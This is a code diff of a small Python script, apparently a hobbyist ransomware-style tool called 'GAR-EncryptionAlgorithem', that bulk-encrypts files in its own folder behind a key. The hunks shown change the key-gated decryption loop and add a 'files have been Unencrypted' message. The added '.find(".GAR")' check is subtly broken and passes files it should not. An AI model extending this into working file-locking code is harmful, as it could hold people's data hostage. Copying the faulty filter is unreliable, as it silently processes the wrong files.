@@ -21,7 +21,7 @@ char = [] #All Characters
 storedkeylist = []
 bytesc = str(random.randint(1000000000000000,9999999999999999999))
 randName = hashlib.md5(bytes(bytesc, "ascii")).hexdigest() + ".py"
-types = [".txt",".text",".bat",".py",".cs",".css",".cpp"]
+types = [".txt",".text",".bat",".py",".cs",".css",".cpp",".lua"]
 
 print("Using GAR-EncryptionAlgorithem --V1.3 --By:2Depth --OpenSource-Version")
 
@@ -161,7 +161,7 @@ def check():
             fils = os.listdir(Path(__file__).parent)
             for fl in range(len(fils)):
                 if fils[fl] != randName:
-                    if canEnc(fils[fl]):
+                    if canEnc(fils[fl]) and fils[fl].find(".GAR"):
                         padir = str(Path(__file__).parent) + "/"
                         toEncFlW = Path(padir+ "/" + fils[fl])
                         daya = str(toEncFlW.read_text())
@@ -169,12 +169,12 @@ def check():
                         toEncFlW.write_text(cd)
                         os.rename(str(padir + fils[fl]),str(padir + fils[fl].replace(".GAR" + str(length),"")))
 
-                    print("Hashed : " + Path(padir + fils[fl]).name)
+                        print("Unhashed : " + Path(padir + fils[fl]).name)
         else:
             fils = os.listdir(Path(__file__).parent)
             for fl in range(len(fils)):
                 if fils[fl] != randName:
-                    if canEnc(fils[fl]):
+                    if canEnc(fils[fl]) and fils[fl].find(".GAR"):
                         padir = str(Path(__file__).parent) + "\\"
                         toEncFlW = Path(padir+ "\\" + fils[fl])
                         daya = str(toEncFlW.read_text())
@@ -182,8 +182,11 @@ def check():
                         toEncFlW.write_text(cd)
                         os.rename(str(padir + fils[fl]),str(padir + fils[fl].replace(".GAR" + str(length),"")))
 
-                    print("Hashed : " + Path(padir + fils[fl]).name)
+                        print("Unhashed : " + Path(padir + fils[fl]).name)
         base.destroy()
+        open("GAR.txt","a")
+        open("GAR.txt","w").write("All of your files have been Unencrypted!")
+
     else:
         messagebox.showerror("Failed","Wrong key!")
 
